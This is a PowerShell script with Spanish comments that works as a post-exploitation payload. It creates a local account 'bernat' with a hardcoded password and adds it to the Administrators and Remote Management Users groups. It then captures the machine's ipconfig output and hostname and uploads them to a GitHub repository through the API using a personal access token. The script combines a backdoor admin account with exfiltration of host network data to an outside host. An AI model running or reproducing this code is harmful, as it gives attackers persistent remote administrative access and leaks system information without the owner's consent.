# Función para generar una cadena aleatoria de 8 caracteres (letras y números)
function Get-RandomString {
    $length = 8
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $randomString = ""
    for ($i = 0; $i -lt $length; $i++) {
        $randomIndex = Get-Random -Minimum 0 -Maximum $chars.Length
        $randomString += $chars[$randomIndex]
    }
    return $randomString
}

# Crear usuario
New-LocalUser -Name 'bernat' -Password (ConvertTo-SecureString 'Contrasena123!' -AsPlainText -Force) -FullName 'Bernat' -Description 'Usuario Administrador'

# Obtener el nombre del grupo "Administradores" utilizando su SID (S-1-5-32-544)
$administratorsGroup = (Get-WmiObject -Class Win32_Group -Filter 'SID="S-1-5-32-544"').Name

# Agregar al usuario "bernat" al grupo "Administradores"
Add-LocalGroupMember -Group $administratorsGroup -Member 'bernat'

# Obtener el nombre del grupo "Remote Management Users" utilizando su SID (S-1-5-32-580)
$remoteManagementGroup = (Get-WmiObject -Class Win32_Group -Filter 'SID="S-1-5-32-580"').Name

# Agregar al usuario "bernat" al grupo "Remote Management Users"
Add-LocalGroupMember -Group $remoteManagementGroup -Member 'bernat'

# Ejecutar ipconfig y almacenar la salida
$ipConfigOutput = ipconfig | Out-String

# Configuración de parámetros
$repoOwner = "xxxbernyxxx"  # Reemplaza con tu nombre de usuario en GitHub
$repoName = "test"        # Reemplaza con el nombre de tu repositorio
$token = "g"         # Reemplaza con tu token de acceso personal de GitHub

# Obtener el nombre del equipo y generar una cadena aleatoria para el archivo
$hostname = $env:COMPUTERNAME
$randomString = Get-RandomString
$filePath = "C:\Users\Public\${hostname}_${randomString}.txt"
$githubFilePath = "${hostname}_${randomString}.txt"
$apiUrl = "https://api.github.com/repos/$repoOwner/$repoName/contents/$githubFilePath"

# Crear el contenido del archivo
$content = "ipconfig output:`n"
$content += "$ipConfigOutput`n"

# Guardar el contenido en el archivo
$content | Out-File -FilePath $filePath -Encoding UTF8

# Leer el archivo y codificarlo en Base64
$fileContent = [System.IO.File]::ReadAllBytes($filePath)
$base64Content = [Convert]::ToBase64String($fileContent)

# Crear el cuerpo de la solicitud para la API de GitHub
$requestBody = @{
    message = "Add ipconfig output from $hostname with random ID $randomString"  # Mensaje de commit
    content = $base64Content                                                     # Contenido codificado en Base64
} | ConvertTo-Json -Depth 10

# Enviar la solicitud a la API de GitHub
try {
    $response = Invoke-RestMethod -Uri $apiUrl -Method Put -Headers @{
        Authorization = "Bearer $token"
        Accept = "application/vnd.github.v3+json"
    } -Body $requestBody

    # Confirmación de finalización
    if ($response.content -eq $base64Content) {
        Write-Output "Archivo subido exitosamente a GitHub como ${hostname}_${randomString}.txt."
    } else {
        Write-Output "YES!."
    }
} catch {
    Write-Output "Error al subir el archivo: $_"
}
